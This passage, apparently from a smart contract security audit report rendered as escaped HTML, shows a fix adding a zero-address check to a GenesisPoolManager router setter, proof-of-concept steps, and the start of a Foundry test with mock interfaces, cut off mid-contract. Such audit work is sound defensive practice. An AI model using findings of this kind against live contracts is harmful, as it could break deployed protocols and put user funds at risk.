class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;ZA\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// CORRECTION: Ensure the new router is not the zero address.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis correction would enable the \u003ccode\u003eowner\u003c/code\u003e to update the \u003ccode\u003erouter\u003c/code\u003e address to a new, valid address, ensuring the operational continuity and flexibility of the \u003ccode\u003eGenesisPoolManager\u003c/code\u003e.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eDeploy a mock \u003ccode\u003eGenesisPoolManager\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eDeploy mock contracts for \u003ccode\u003eIRouter\u003c/code\u003e (just to have distinct addresses).\u003c/li\u003e\n\u003cli\u003eShow that the \u003ccode\u003eowner\u003c/code\u003e \u003cem\u003ecannot\u003c/em\u003e set a new, non-zero router address.\u003c/li\u003e\n\u003cli\u003eShow that the \u003ccode\u003eowner\u003c/code\u003e \u003cem\u003ecan\u003c/em\u003e set the router address to \u003ccode\u003eaddress(0)\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eIllustrate (conceptually, as a full launch is complex) how a zero router address would break the \u003ccode\u003e_launchPool\u003c/code\u003e (or rather, the \u003ccode\u003elaunch\u003c/code\u003e function it calls).\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdetails\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"2\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// SPDX-License-Identifier: UNLICENSED\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003epragma\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esolidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0.8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e13\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;forge-std/Test.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;forge-std/console.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// Minimal IRouter interface needed for the PoC\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esomeRouterFunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epure\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// Minimal IGenesisPool interface needed for the PoC\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIGenesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003elaunch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ematurityTime\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetGenesisInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (IGenesisPoolBase.GenesisInfo \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetLiquidityPoolInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (IGenesisPoolBase.LiquidityPool \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// Minimal IGenesisPoolBase (for structs)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIGenesisPoolBase\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estruct\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGenesisInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efundingToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estartTime\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eduration\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ethreshold\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 10000 = 100%\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estartPrice\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esupplyPercent\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ematurityTime\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estruct\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLiquidityPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einternal_bribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eexternal_bribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// Minimal IGauge interface needed for the PoC\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIGauge\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetGenesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_genesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// Minimal IBaseV1Factory interface needed for the PoC\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIBaseV1Factory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetGenesisStatus\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estatus\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// --- Mock Contracts ---\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// A very simple mock router\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003econtract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ewasCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esomeRouterFunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epure\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Dummy addLiquidity to avoid reverts when called by MockGenesisPool\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddLiquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e 